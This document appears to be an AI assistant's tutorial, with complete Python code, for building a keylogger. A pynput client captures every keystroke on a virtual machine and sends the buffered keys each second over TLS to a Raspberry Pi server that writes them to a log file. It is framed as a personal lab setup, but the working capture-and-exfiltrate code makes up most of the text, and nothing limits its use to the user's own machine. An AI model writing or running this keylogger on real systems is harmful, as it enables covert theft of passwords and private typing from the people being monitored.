Here’s a step-by-step guide to creating a secure IoT-based keylogger with encryption, where your Raspberry Pi acts as the server receiving keystrokes, and your virtual machine (VM) acts as the client recording them. We'll use Python for the implementation, leveraging SSL/TLS for encryption to ensure secure communication over the network. Below is the process and the code you’ll need.

Step-by-Step Process

Step 1: Set Up the Environment

  • Raspberry Pi (Server):
    • Ensure your Raspberry Pi is powered on, running an OS like Raspberry Pi OS (Linux-based), and connected to your network.
    • Note its IP address (e.g., run hostname -I in the terminal to find it).
    • Install Python if it’s not already installed (sudo apt update && sudo apt install python3).
  • Virtual Machine (Client):
    • Set up a VM using software like VirtualBox or VMware, running an OS such as Ubuntu or Windows.
    • Ensure the VM is on the same network as the Raspberry Pi (e.g., use a bridged network adapter).
    • Install Python on the VM (sudo apt install python3 for Ubuntu, or download from python.org for Windows).
  • Network Check:
    • Verify connectivity by pinging the Raspberry Pi from the VM (ping <raspberry_pi_ip>).

Step 2: Install Required Libraries

  • On both the Raspberry Pi and VM, install the necessary Python libraries:
    • For the client (VM): Install pynput to capture keystrokes.
      bash
      pip3 install pynput
    • No additional libraries are needed beyond Python’s standard socket and ssl modules, which are included by default.

Step 3: Generate a Self-Signed SSL Certificate

  • To secure communication with SSL/TLS, generate a certificate and private key for the server (Raspberry Pi).
  • On the Raspberry Pi, use OpenSSL (install it with sudo apt install openssl if needed):
    bash
    openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes
  • Follow the prompts to fill in details (e.g., country, organization). This creates:
    • server.key: The private key.
    • server.crt: The certificate.
  • Copy server.crt to the VM (e.g., via SCP: scp server.crt user@vm_ip:/path/to/destination).

Step 4: Write the Server Code (Raspberry Pi)

  • Create a Python script on the Raspberry Pi to receive encrypted keystrokes and log them.
  • Save this as server.py:
    python
    import socket import ssl # Create SSL context for the server context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER) context.load_cert_chain(certfile='server.crt', keyfile='server.key') # Set up the server socket server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_socket.bind(('0.0.0.0', 4433)) # Port 4433 (can be changed) server_socket.listen(5) # Open a log file to store keystrokes log_file = open('keystrokes.log', 'a') print("Server started, waiting for connections...") while True: # Accept incoming connections client_socket, address = server_socket.accept() ssl_client_socket = context.wrap_socket(client_socket, server_side=True) try: # Receive data in chunks data = ssl_client_socket.recv(1024) while data: decoded_data = data.decode() print(f"Received: {decoded_data}") log_file.write(decoded_data) log_file.flush() # Ensure data is written immediately data = ssl_client_socket.recv(1024) except Exception as e: print(f"Error: {e}") finally: ssl_client_socket.close()
  • Place server.crt and server.key in the same directory as server.py.

Step 5: Write the Client Code (VM)

  • Create a Python script on the VM to capture keystrokes and send them securely to the server.
  • Save this as client.py:
    python
    import pynput import socket import ssl import threading import time from pynput.keyboard import Key, Listener # Server details (replace with your Raspberry Pi's IP) SERVER_HOST = '<raspberry_pi_ip>' SERVER_PORT = 4433 # Set up SSL context for the client context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT) context.load_verify_locations('server.crt') # Path to the certificate # Buffer to store keystrokes keystroke_buffer = [] def on_press(key): """Capture keystrokes and add them to the buffer.""" try: char = key.char # For alphanumeric keys except AttributeError: char = str(key) # For special keys like Key.space keystroke_buffer.append(char) def send_keystrokes(): """Send buffered keystrokes to the server every second.""" while True: if keystroke_buffer: data = ''.join(keystroke_buffer) keystroke_buffer.clear() try: with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: with context.wrap_socket(s, server_hostname=SERVER_HOST) as ss: ss.connect((SERVER_HOST, SERVER_PORT)) ss.sendall(data.encode()) print(f"Sent: {data}") except Exception as e: print(f"Error sending data: {e}") time.sleep(1) # Send every second # Start the sending thread sending_thread = threading.Thread(target=send_keystrokes, daemon=True) sending_thread.start() # Start the keylogger print("Keylogger started. Press keys to record.") with Listener(on_press=on_press) as listener: listener.join()
  • Replace <raspberry_pi_ip> with the actual IP address of your Raspberry Pi.
  • Ensure server.crt is in the same directory as client.py.

Step 6: Run the Server

  • On the Raspberry Pi, run the server script:
    bash
    python3 server.py
  • It will start listening for connections on port 4433.

Step 7: Run the Client

  • On the VM, run the client script:
    bash
    python3 client.py
  • Start typing on the VM, and the keystrokes will be sent to the Raspberry Pi.

Step 8: Test the Setup

  • Type some text on the VM (e.g., “hello world”).
  • Check the Raspberry Pi:
    • Look at the terminal output to see received data.
    • Open keystrokes.log (cat keystrokes.log) to verify the keystrokes are logged.

Step 9: Secure and Finalize

  • Permissions: Run the client with appropriate permissions (e.g., sudo on Linux if needed for keylogging).
  • Firewall: Ensure port 4433 is open on the Raspberry Pi (sudo ufw allow 4433 if using a firewall).
  • Security Note: This uses a self-signed certificate. For real-world use, obtain a certificate from a trusted authority.

How It Works

  • Server (Raspberry Pi):
    • Listens for encrypted connections using SSL/TLS.
    • Receives keystrokes and writes them to keystrokes.log.
  • Client (VM):
    • Uses pynput to capture every keystroke.
    • Stores keystrokes in a buffer.
    • A separate thread sends the buffer to the server every second over an SSL-encrypted connection.
  • Encryption:
    • SSL/TLS ensures that keystrokes are encrypted during transmission, protecting them from interception.
